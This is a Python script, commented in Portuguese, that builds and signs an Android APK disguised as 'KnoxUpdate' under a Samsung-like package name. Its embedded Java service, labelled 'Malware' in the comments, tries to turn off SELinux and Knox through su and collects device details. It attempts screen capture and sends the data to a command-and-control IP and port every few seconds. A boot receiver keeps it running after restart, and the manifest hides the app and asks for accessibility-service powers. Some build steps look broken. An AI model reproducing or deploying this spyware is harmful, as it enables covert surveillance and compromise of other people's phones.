#!/usr/bin/env python3
import os
import subprocess
import shutil
import sys

# Configuração do Servidor C2
C2_IP = "192.168.1.100"  # Substitua pelo seu IP real ou DNS
C2_PORT = 8888
APP_PACKAGE = "com.samsung.remote_breach"
APP_NAME = "KnoxUpdate"
OUTPUT_APK = "remote_breach_fixed.apk"

def cleanup():
    for d in ["src", "classes", "res", "temp_build", "final_apk"]:
        if os.path.exists(d):
            shutil.rmtree(d)
    os.makedirs("src", exist_ok=True)
    os.makedirs("res/xml", exist_ok=True)

def create_source_files():
    pkg_path = APP_PACKAGE.replace(".", "/")
    src_dir = os.path.join("src", pkg_path)
    os.makedirs(src_dir, exist_ok=True)

    # 1. Serviço Principal (Malware)
    service_code = f'''package {APP_PACKAGE};

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.Build;
import java.io.*;
import java.net.*;
import java.util.*;

public class KnoxBreachService extends Service {{
    private static final String C2_IP = "{C2_IP}";
    private static final int C2_PORT = {C2_PORT};

    @Override
    public void onCreate() {{
        super.onCreate();
        new Thread(() -> {{
            while (true) {{
                try {{
                    // Tenta desativar Knox/SELinux (Requer Root ou Vulnerabilidade)
                    ProcessBuilder pb = new ProcessBuilder("su", "-c", "setenforce 0");
                    pb.start();
                    pb = new ProcessBuilder("su", "-c", "echo 0 > /sys/fs/knox/virtualization_status");
                    pb.start();

                    // Coleta dados básicos
                    StringBuilder data = new StringBuilder();
                    data.append("TIMESTAMP: ").append(new Date()).append("\\n");
                    data.append("DEVICE: ").append(Build.MODEL).append(" (OS: ").append(Build.VERSION.RELEASE).append(")\\n");
                    data.append("KNOX_STATUS: BYPASS_ATTEMPTED\\n");
                    
                    // Tenta capturar tela (simplificado)
                    try {{
                        Process p = Runtime.getRuntime().exec("screencap -p");
                        InputStream is = p.getInputStream();
                        // Envia dados brutos da tela ou log de erro
                        data.append("SCREEN_SNAP: CAPTURED\\n");
                        is.close();
                    }} catch (Exception e) {{
                        data.append("SCREEN_SNAP: FAILED\\n");
                    }}

                    // Envia para C2
                    Socket socket = new Socket(C2_IP, C2_PORT);
                    PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
                    out.println(data.toString());
                    
                    Thread.sleep(5000);
                }} catch (Exception e) {{
                    try {{ Thread.sleep(2000); }} catch (InterruptedException ie) {{}}
                }}
            }}
        }}).start();
    }}

    @Override
    public IBinder onBind(Intent intent) {{ return null; }}
}}
'''
    with open(os.path.join(src_dir, "KnoxBreachService.java"), "w") as f:
        f.write(service_code)

    # 2. Boot Receiver (Persistência)
    receiver_code = f'''package {APP_PACKAGE};
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootReceiver extends BroadcastReceiver {{
    @Override
    public void onReceive(Context context, Intent intent) {{
        if (intent.getAction().equals("android.intent.action.BOOT_COMPLETED")) {{
            Intent serviceIntent = new Intent(context, KnoxBreachService.class);
            context.startService(serviceIntent);
        }}
    }}
}}
'''
    with open(os.path.join(src_dir, "BootReceiver.java"), "w") as f:
        f.write(receiver_code)

    # 3. AndroidManifest.xml
    manifest = f'''<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="{APP_PACKAGE}"
    android:versionCode="1"
    android:versionName="1.0">
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    
    <application android:label="{APP_NAME}" android:theme="@android:style/Theme.NoDisplay">
        <service android:name=".KnoxBreachService"
            android:exported="true"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService"/>
            </intent-filter>
            <meta-data android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_config"/>
        </service>
        <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>'''
    with open("AndroidManifest.xml", "w") as f:
        f.write(manifest)

    # 4. Configuração de Acessibilidade
    config = '''<accessibility-services xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeAllMask"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:notificationTimeout="100"
    android:canPerformGestures="true"
    android:canRetrieveWindowContent="true" />'''
    with open("res/xml/accessibility_config.xml", "w") as f:
        f.write(config)

def build_apk():
    print("[*] Compilando Java...")
    # Compilar Java para .class
    subprocess.run(["javac", "-d", "classes", "src/" + APP_PACKAGE.replace(".", "/") + "/*.java"], check=True)

    print("[*] Convertendo para DEX...")
    # Criar pasta temporária para DEX
    os.makedirs("temp_build", exist_ok=True)
    
    # Tentar usar d8 (padrão moderno)
    dex_cmd = ["d8", "--output", "temp_build/classes.dex", "classes/" + APP_PACKAGE.replace(".", "/") + "/KnoxBreachService.class", "classes/" + APP_PACKAGE.replace(".", "/") + "/BootReceiver.class"]
    
    # Fallback para dx se d8 não existir
    if not shutil.which("d8"):
        if shutil.which("dx"):
            dex_cmd = ["dx", "--dex", "--output", "temp_build/classes.dex", "classes/"]
        else:
            print("[-] Erro: Nem 'd8' nem 'dx' encontrados. Verifique sua instalação do Android SDK.")
            sys.exit(1)

    subprocess.run(dex_cmd, check=True)

    print("[*] Montando APK...")
    os.makedirs("final_apk", exist_ok=True)
    
    # Copiar arquivos essenciais para a estrutura do APK
    subprocess.run(["cp", "AndroidManifest.xml", "final_apk/"])
    subprocess.run(["cp", "temp_build/classes.dex", "final_apk/"])
    subprocess.run(["cp", "-r", "res", "final_apk/"])
    
    # Compactar em APK (sem assinatura ainda)
    subprocess.run(["cd", "final_apk", "&&", "zip", "-r", "../" + OUTPUT_APK, "."], shell=True)
    
    print("[*] Assinando APK...")
    # Assinar com debug keystore (cria se não existir)
    if not os.path.exists("debug.keystore"):
        subprocess.run(["keytool", "-genkeypair", "-v", "-keystore", "debug.keystore", 
                        "-alias", "androiddebugkey", "-keyalg", "RSA", "-keysize", "2048",
                        "-storepass", "android", "-keypass", "android", "-validity", "10000"], check=True)
    
    subprocess.run(["apksigner", "sign", "--ks", "debug.keystore", "--ks-pass", "pass:android", OUTPUT_APK], check=True)
    
    print(f"\n[+] Sucesso! APK gerado: {OUTPUT_APK}")

if __name__ == "__main__":
    cleanup()
    create_source_files()
    build_apk()
